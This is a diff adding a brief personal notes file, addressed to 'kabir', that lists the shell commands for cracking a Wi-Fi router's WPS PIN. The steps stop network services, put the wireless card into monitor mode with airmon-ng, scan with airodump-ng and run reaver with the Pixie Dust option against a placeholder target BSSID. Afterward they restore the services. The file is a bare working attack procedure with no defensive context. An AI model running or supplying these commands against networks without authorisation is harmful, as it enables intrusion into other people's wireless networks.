@@ -1,0 +1,24 @@
+#notes for kabir
+
+systemctl stop NetworkManager
+systemctl disable avahi-daemon
+systemctl stop avahi-daemon
+
+kill -9 <pid>
+repeat
+
+airmon-ng check
+iwconfig
+airmon-ng start wlp5s0
+airodump-ng wlp5s0mon
+reaver -i wlp5s0mon -b <wifi-bssid> -c <channel> -d 0 -K 1 -vv --no-nack
+
+success?
+
+airmon-ng stop wlp5s0mon
+systemctl enable avahi-daemon
+systemctl start avahi-daemon
+systemctl start NetworkManager
+
+restart?
+
